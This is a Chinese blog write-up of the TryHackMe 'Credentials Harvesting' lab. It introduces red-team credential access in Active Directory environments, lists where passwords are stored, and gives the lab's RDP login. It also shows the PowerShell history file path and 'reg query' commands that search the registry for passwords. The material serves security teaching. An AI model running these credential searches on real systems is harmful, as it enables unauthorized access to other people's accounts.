
<!DOCTYPE html><html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1" theme-name="Stellar" theme-version="1.28.1">
  
  <meta name="generator" content="Hexo 7.2.0">
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f9fafb">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
  
  <title>THM-Credentials Harvesting(凭据收集) - hybcx's blog</title>

  
    <meta name="description" content="0x01 简介 欢迎来到凭证收集 该会议室讨论红队成员利用获得的凭证执行横向移动并访问 AD 环境中的资源的基础知识。我们将展示如何获取、重用和模拟用户凭据。 凭据收集包括获取登录信息、帐户名和密码等凭据的技术。它是一种从系统中不同位置（例如明文文件、注册表、内存转储等）提取凭证信息的技术。 作为红队成员，获得合法凭证有以下好处：  它可以提供对系统的访问（横向移动）。 这使得我们的行为更难被发现">
<meta property="og:type" content="article">
<meta property="og:title" content="THM-Credentials Harvesting(凭据收集)">
<meta property="og:url" content="http://hybcx.xyz/2024/03/04/thm-ping-ju-shou-ji/index.html">
<meta property="og:site_name" content="hybcx&#39;s blog">
<meta property="og:description" content="0x01 简介 欢迎来到凭证收集 该会议室讨论红队成员利用获得的凭证执行横向移动并访问 AD 环境中的资源的基础知识。我们将展示如何获取、重用和模拟用户凭据。 凭据收集包括获取登录信息、帐户名和密码等凭据的技术。它是一种从系统中不同位置（例如明文文件、注册表、内存转储等）提取凭证信息的技术。 作为红队成员，获得合法凭证有以下好处：  它可以提供对系统的访问（横向移动）。 这使得我们的行为更难被发现">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304170547403.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304170719917.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304171303219.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304171334825.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304171924389.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304172134665.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304172513895.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304172717217.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304173017012.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304173259902.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304173912264.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304174431281.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304174705554.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304183014283.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304184144156.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304184533656.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304184653686.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304184836865.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304185247113.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304185339528.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304185510843.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304185557853.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304190455212.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304190631270.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304190830140.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304190956102.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304191423150.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304192420407.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304192637664.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304193606451.png">
<meta property="og:image" content="c:/Users/%E4%BB%98%E6%80%9D%E9%92%A7/AppData/Roaming/Typora/typora-user-images/image-20240304193633712.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304193701369.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304193734379.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304194432969.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304195145292.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304195607596.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304195821287.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304195938684.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304200321271.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304200421177.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304200515110.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304200654836.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304200816399.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304200826833.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304200947242.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240305160908460.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240305161134702.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240305161228621.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240305161036051.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240305162231942.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240305162519619.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240305162948591.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240305163118969.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240305163220509.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240305163335507.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240305163748088.png">
<meta property="article:published_time" content="2024-03-04T08:25:20.730Z">
<meta property="article:modified_time" content="2024-03-05T09:42:13.821Z">
<meta property="article:author" content="hybcx">
<meta property="article:tag" content="TryHackMe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304170547403.png">
  
  
  
  <meta name="keywords" content="TryHackMe">

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="hybcx's blog" type="application/atom+xml">
  

  <link rel="stylesheet" href="/css/main.css?v=1.28.1">

  
    <link rel="shortcut icon" href="/medias/logo.png">
  

  
    
<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">

  

  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'">

<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>
<body>

<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">


<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">人生当是精彩的</div><div class="sub hover cap" style="opacity:0"> 何必忧虑未来！</div></a></div></header>

<div class="nav-area">
<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>


<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
</div>
<div class="widgets">


<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/06/15/du-web-gong-fang-you-gan/"><span class="title">读web攻防有感</span></a><a class="item title" href="/2024/03/29/thm-jin-gong-xing-shen-tou-ce-shi/"><span class="title">THM-进攻性渗透测试</span></a><a class="item title" href="/2024/06/29/xuan-ji-ying-ji-xiang-ying-ba-chang/"><span class="title">玄机应急响应靶场</span></a><a class="item title" href="/2024/06/17/thm-corp/"><span class="title">THM-Corp</span></a><a class="item title" href="/2024/06/16/thm-hacking-with-powershell/"><span class="title">THM-Hacking_With_PowerShell</span></a><a class="item title" href="/2024/06/10/thm-exploiting-active-directory/"><span class="title">THM-Exploiting Active Directory</span></a><a class="item title" href="/2024/06/11/thinkphp5-dai-shen/"><span class="title">ThinkPHP5代码审计</span></a><a class="item title" href="/2024/06/01/seacms-dai-ma-shen-ji/"><span class="title">SeaCMS代码审计</span></a><a class="item title" href="/2024/06/09/thm-enumerating-active-directory/"><span class="title">THM-Enumerating Active Directory</span></a><a class="item title" href="/2024/02/19/thm-persisting-active-directory/"><span class="title">THM-Persisting Active Directory</span></a></div></widget>
</div>
<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/hybchenxing/" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/github-logo2.png"/></a><a class="social" href="https://music.163.com/#/user/home?id=9895561810" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/neteasemusic-icon.png"/></a><a class="social" href="https://space.bilibili.com/1761635300" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/bilibili-icon.png"/></a><a class="social" href="https://muselink.cc/hybcx" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/weChat.png"/></a><a class="social" href="javaScript:void('永夜');" rel="noopener noreferrer"><img class="lazy" id="ThemeM" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/moon.svg"/></a><a class="social" href="javaScript:void('永昼');" rel="noopener noreferrer"><img class="lazy" id="ThemeL" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/sun.svg"/></a></div></footer>
</div></aside><div class="l_main" id="main">





<div class="article banner top">
  <div class="content">
    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/TryHackMe/">TryHackMe</a></div>
<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-03-04T08:25:20.730Z">2024-03-04</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-03-05T09:42:13.821Z">2024-03-05</time></span></div></div></div>
    
    <div class="bottom only-title">
      
      <div class="text-area">
        <h1 class="text title"><span>THM-Credentials Harvesting(凭据收集)</span></h1>
        
      </div>
    </div>
    
  </div>
  </div><article class="md-text content"><h1 id="0x01-简介">0x01 简介</h1>
<h2 id="欢迎来到凭证收集">欢迎来到凭证收集</h2>
<p>该会议室讨论红队成员利用获得的凭证执行横向移动并访问 AD 环境中的资源的基础知识。我们将展示如何获取、重用和模拟用户凭据。</p>
<p>凭据收集包括获取登录信息、帐户名和密码等凭据的技术。它是一种从系统中不同位置（例如明文文件、注册表、内存转储等）提取凭证信息的技术。</p>
<p>作为红队成员，获得合法凭证有以下好处：</p>
<ul>
<li>它可以提供对系统的访问（横向移动）。</li>
<li>这使得我们的行为更难被发现。</li>
<li>它提供了创建和管理帐户的机会，以帮助实现红队参与的最终目标。</li>
</ul>
<h2 id="学习目标">学习目标</h2>
<ul>
<li>了解从本地windows（SAM数据库）提取凭证的方法</li>
<li>了解如何在本地和远程访问 Windows 内存并转储明文密码和身份验证票证。</li>
<li>Windows 凭据管理器简介以及如何提取凭据。</li>
<li>了解提取域控制器凭据的方法</li>
<li>枚举本地管理员密码解决方案 (LAPS) 功能。</li>
<li>介绍导致获取凭据的 AD 攻击。</li>
</ul>
<h1 id="0x02-凭据收集介绍和实验环境部署">0x02 凭据收集介绍和实验环境部署</h1>
<p>凭证收集是一个术语，是指攻击者尝试获取用于访问目标用户或者目标系统的有效凭据，它是一种检索或者窃取目标机器中已经存储的有效凭据的技术，包括通过网络嗅探攻击来捕捉已传输的有效凭据。</p>
<p>凭据可以以各种不同的形式被我们找到，例如：</p>
<ul>
<li>帐户详细信息(用户名和密码)。</li>
<li>密码哈希值(包括NTLM哈希等)。</li>
<li>身份验证票据，例如票据授予票据(TGT)、票据授予服务器(TGS)。</li>
<li>任何有助于我们登录目标系统的信息(如私钥等)</li>
</ul>
<p>一般来说，凭据收集可以分为两种类型：外部凭据收集、内部凭据收集。</p>
<p>外部凭据收集可能涉及网络电子邮件钓鱼等相关技术，主要是诱导用户输入其有效的用户名和密码；而内部凭据收集则需要攻击者使用不同的方法来实现。</p>
<p>我们将重点介绍内部凭据收集技术，假设我们作为攻击者已经获得了针对目标AD域的初始访问权限，与本文实验相关的目标AD域将会把Windows Server 2019机器配置为域控制器，我们可以在<a target="_blank" rel="noopener" href="https://tryhackme.com/room/credharvesting">对应的Tryhackme实验房间</a>中部署该目标机器(作为DC)。</p>
<p>成功部署好目标机器之后，我们可以选择直接通过浏览器访问该机器或者使用以下凭据在攻击机上通过RDP来访问目标机器：</p>
<ul>
<li>Machine IP: MACHINE_IP(在Tryhackme实验房间页面中部署目标机器，这将随机获得相关的目标IP地址)</li>
<li>Username: <code>thm</code></li>
<li>Password: <code>Passw0rd!</code></li>
<li>目标域：THM或者THM.red</li>
</ul>
<h1 id="0x03-凭据访问">0x03 凭据访问</h1>
<p>凭据访问是指攻击者在被入侵的系统中发现有效凭据并且获得对用户凭据的访问权限，这可以帮助攻击者重用有效凭据或者冒充正常AD用户的身份。凭据访问是攻击者进行内网横向移动和访问其他资源(如其他应用程序或系统)的重要前提步骤。对于攻击者而言，尝试获取合法的用户凭据比使用cve来对目标系统进行漏洞利用更加具有可取之处。</p>
<p>关于“凭据访问”的更多信息，请查看MITRE ATT&amp;CK框架的相关部分说明：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://attack.mitre.org/tactics/TA0006/">https://attack.mitre.org/tactics/TA0006/</a></p>
</blockquote>
<p>用户凭据可能会被不安全地存储在目标系统中的不同位置：</p>
<ul>
<li>Clear-text files：明文文件；</li>
<li>Database files：数据库文件；</li>
<li>Memory：内存；</li>
<li>Password managers：密码管理器；</li>
<li>Enterprise Vaults：企业保险库；</li>
<li>Active Directory：活动目录；</li>
<li>Network Sniffing：网络嗅探。</li>
</ul>
<h2 id="以明文文件形式存储凭据">以明文文件形式存储凭据</h2>
<p>攻击者可能会在被入侵的机器上搜索本地或远程文件系统中的凭据，因此而发现的明文文件可能包含用户所创建的敏感信息，包括密码、私钥等。MITRE ATT&amp;CK框架将这种凭据信息定义为不安全凭据：文件中的凭据(<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1552/001/">T1552.001</a>)。</p>
<p>以下是攻击者可能会感兴趣的几种明文文件类型：</p>
<ul>
<li>关于命令的历史文件；</li>
<li>配置文件(Web应用程序相关文件、FTP文件…)；</li>
<li>其他与Windows应用程序(网络浏览器、电子邮件客户端等)相关的文件；</li>
<li>备份文件；</li>
<li>共享文件和文件夹；</li>
<li>注册表；</li>
<li>源代码。</li>
</ul>
<p>以历史命令为例，在目标系统中已经执行过的PowerShell命令会被作为用户配置保存到历史文件中，具体路径如下：</p>
<blockquote>
<p>C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</p>
</blockquote>
<p>对于攻击者而言，检查目标用户正在做什么或者查找与用户相关的敏感信息可能是值得尝试的操作。我们可以尝试寻找我们所感兴趣的信息，例如，下面的命令可用于在目标机器的windows注册表中查找“password”关键字：</p>
<pre><code class="hljs scss">c:\Users\user&gt; reg query HKLM /f password /t REG_SZ /s
#OR
C:\Users\user&gt; reg query HKCU /f password /t REG_SZ /s</code></pre>
<h2 id="以数据库文件形式存储凭据">以数据库文件形式存储凭据</h2>
<p>应用程序通常会使用数据库文件来读取或者写入设置、配置或凭据。在Windows操作系统中，数据库文件通常存储在本地，这些文件是我们检索和查找凭据的绝佳目标。</p>
<p>关于这部分内容，我们可以参考以下博客文件，该文章的内容包含了从目标系统本地的McAfee Endpoint数据库文件中提取凭据的演示示例。</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hekeats-L/p/17418029.html">【THM】Breaching Active Directory(入侵活动目录)-红队</a></li>
</ul>
<h2 id="使用密码管理器来存储凭据">使用密码管理器来存储凭据</h2>
<p>密码管理器是存储和管理用户用于登录本地机器和Internet网站、服务的密码信息的应用程序，由于它处理的是用户的敏感数据，因此密码管理器中的数据必须被安全地存储，以防止攻击者进行未经授权的访问。</p>
<p>关于密码管理器应用程序的示例如下所示：</p>
<ul>
<li>内置密码管理器(Windows)；</li>
<li>第三方密码管理器，如KeePass、1Password、LastPass等。</li>
</ul>
<p>在这些密码管理器应用程序中也可能存在一些错误配置和安全漏洞，这将使得攻击者能够尝试访问密码管理器中所存储的数据。在信息枚举阶段，攻击者可以使用各种工具来获取目标机器上的网络浏览器和桌面应用程序所使用的密码管理器应用程序中已存储的敏感数据。</p>
<p>在本文中，我们将讨论如何访问Windows凭据管理器并尝试提取其中所存储的密码信息。</p>
<h2 id="通过内存转储获取凭据">通过内存转储获取凭据</h2>
<p>操作系统内存是Windows操作系统、用户和其他应用程序所相关的敏感信息的丰富来源。计算机数据会在应用程序运行时或执行过程中被加载到内存中，因此，只有对目标系统具有完全控制权限的管理员用户才能手动访问内存。</p>
<p>以下是会被存储在目标系统内存中的敏感数据的例子，包括：</p>
<ul>
<li>明文形式的凭据；</li>
<li>已经缓存的密码；</li>
<li>AD票据。</li>
</ul>
<p>在本文中，我们将讨论如何访问目标系统的内存并尝试提取明文密码和用于身份验证的票据。</p>
<h2 id="活动目录中的凭据">活动目录中的凭据</h2>
